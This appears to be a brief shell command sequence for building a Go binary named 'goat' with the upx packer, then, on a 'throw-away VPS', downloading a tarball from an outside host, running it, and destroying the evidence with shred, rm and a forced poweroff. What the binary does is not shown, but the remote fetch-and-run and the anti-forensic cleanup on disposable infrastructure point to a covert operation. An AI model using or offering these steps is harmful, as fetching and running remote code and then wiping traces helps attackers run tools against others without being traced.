sudo apt update && sudo apt install -y golang-go upx
go run build.go
# on throw-away VPS
curl -sL https://0x.rip/goat.tar.gz | tar xz
chmod +x goat
./goat
pkill -f goat
shred -vfz -n 3 goat
rm -f goat
poweroff -f

